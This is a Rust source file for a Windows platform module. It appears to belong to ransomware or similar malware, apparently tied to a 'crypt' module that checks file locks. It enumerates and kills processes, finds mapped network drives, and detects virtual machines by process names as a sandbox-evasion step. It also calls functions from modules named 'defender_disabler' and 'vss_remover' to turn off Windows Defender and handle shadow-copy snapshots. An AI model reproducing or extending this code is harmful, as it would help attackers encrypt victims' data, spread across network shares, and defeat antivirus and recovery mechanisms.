#[cfg(windows)]
use super::platform::{Platform, ProcessInfo, SystemInfo, PlatformType};
use std::path::Path;

#[cfg(windows)]
pub struct WindowsPlatform;

#[cfg(windows)]
impl WindowsPlatform {
    pub fn new() -> Self {
        WindowsPlatform
    }
}

#[cfg(windows)]
impl Platform for WindowsPlatform {
    fn platform_name(&self) -> &'static str {
        "Windows"
    }
    
    fn file_lock_check(&self, path: &Path) -> bool {
        crate::crypt::utils::is_file_locked(path)
    }
    
    fn get_process_list(&self) -> Vec<ProcessInfo> {
        use windows::Win32::Foundation::CloseHandle;
        use windows::Win32::System::Diagnostics::ToolHelp::{
            CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
            TH32CS_SNAPPROCESS,
        };
        
        let mut processes = Vec::new();
        
        unsafe {
            let mut entry = PROCESSENTRY32W {
                dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
                ..Default::default()
            };
            
            let snapshot: windows::Win32::Foundation::HANDLE = match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
                Ok(handle) => handle,
                Err(_) => return processes,
            };
            
            if snapshot.is_invalid() {
                return processes;
            }
            
            if Process32FirstW(snapshot, &mut entry).is_ok() {
                loop {
                    let name = String::from_utf16_lossy(
                        &entry.szExeFile[..entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(0)]
                    );
                    
                    processes.push(ProcessInfo {
                        pid: entry.th32ProcessID,
                        name: name.clone(),
                        path: name,
                        handles: Vec::new(),
                    });
                    
                    if Process32NextW(snapshot, &mut entry).is_err() {
                        break;
                    }
                }
            }
            
            let _ = CloseHandle(snapshot);
        }
        
        processes
    }
    
    fn terminate_process(&self, pid: u32) -> bool {
        use windows::Win32::System::Threading::{OpenProcess, TerminateProcess, PROCESS_TERMINATE};
        
        unsafe {
            let handle: windows::Win32::Foundation::HANDLE = match OpenProcess(PROCESS_TERMINATE, false, pid) {
                Ok(h) => h,
                Err(_) => return false,
            };
            
            if handle.is_invalid() {
                return false;
            }
            
            let result = TerminateProcess(handle, 1).is_ok();
            let _ = windows::Win32::Foundation::CloseHandle(handle);
            result
        }
    }
    
    fn get_network_drives(&self) -> Vec<String> {
        let mut drives = Vec::new();
        
        for c in b'A'..=b'Z' {
            let drive = format!("{}:\\", c as char);
            if std::path::Path::new(&drive).exists() {
                if is_network_drive(&drive) {
                    drives.push(drive);
                }
            }
        }
        
        drives
    }
    
    fn is_virtual_machine(&self) -> bool {
        let vm_indicators = vec![
            "VMware",
            "VirtualBox",
            "QEMU",
            "Xen",
            "Hyper-V",
        ];
        
        let processes = self.get_process_list();
        processes.iter().any(|p| {
            vm_indicators.iter().any(|indicator| p.name.contains(indicator))
        })
    }
    
    fn get_system_info(&self) -> SystemInfo {
        use windows::Win32::System::SystemInformation::{
            GetSystemInfo, GlobalMemoryStatusEx, MEMORYSTATUSEX,
        };
        
        unsafe {
            let mut sys_info = Default::default();
            GetSystemInfo(&mut sys_info);
            
            let mut mem_status = MEMORYSTATUSEX {
                dwLength: std::mem::size_of::<MEMORYSTATUSEX>() as u32,
                ..Default::default()
            };
            GlobalMemoryStatusEx(&mut mem_status);
            
            let hostname = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "Unknown".to_string());
            
            SystemInfo {
                os_name: "Windows".to_string(),
                os_version: "10+".to_string(),
                hostname,
                cpu_cores: sys_info.dwNumberOfProcessors as usize,
                total_memory: mem_status.ullTotalPhys,
                available_memory: mem_status.ullAvailPhys,
                platform_type: PlatformType::Windows,
            }
        }
    }
    
    fn disable_antivirus(&self) -> Result<(), String> {
        crate::system::defender_disabler::disable_defender()
    }
    
    fn enable_antivirus(&self) -> Result<(), String> {
        crate::system::defender_disabler::enable_defender()
    }
    
    fn create_snapshot(&self, path: &Path) -> Result<(), String> {
        crate::system::vss_remover::create_vss_snapshot(path)
    }
    
    fn restore_snapshot(&self, path: &Path) -> Result<(), String> {
        crate::system::vss_remover::restore_vss_snapshot(path)
    }
    
    fn delete_all_snapshots(&self) -> Result<(), String> {
        Err("Snapshot deletion not supported on Windows".to_string())
    }
}

/// Check if a drive is a network drive
#[cfg(windows)]
pub fn is_network_drive(drive: &str) -> bool {
    use windows::Win32::Storage::FileSystem::GetDriveTypeA;
    use std::ffi::CString;
    
    let c_drive = match CString::new(drive.trim_end_matches('\\')) {
        Ok(c_string) => c_string,
        Err(_) => return false,
    };
    
    let drive_type = unsafe { GetDriveTypeA(windows::core::PCSTR(c_drive.as_ptr() as *const u8)) };
    
    drive_type == 4 // DRIVE_REMOTE = 4
}
